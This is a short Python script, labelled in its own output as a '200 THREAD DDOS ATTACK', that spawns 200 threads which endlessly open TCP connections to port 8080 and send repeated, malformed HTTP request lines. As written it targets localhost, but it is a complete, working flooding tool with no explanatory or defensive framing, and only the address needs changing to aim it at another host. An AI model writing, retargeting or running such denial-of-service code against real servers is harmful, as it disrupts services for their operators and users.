#!/usr/bin/env python3
import socket
import threading
import random
import time

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(("127.0.0.1", 8080))
            s.send(b"GET / HTTP/1.1\r\n" * random.randint(10,50) + b"Host: localhost\r\n\r\n")
            s.close()
        except:
            pass

print("💥 200 THREAD DDOS ATTACK LAUNCHED!")
for i in range(200):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    print(f"Attack thread {i+1}/200")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n🛑 Attack stopped")
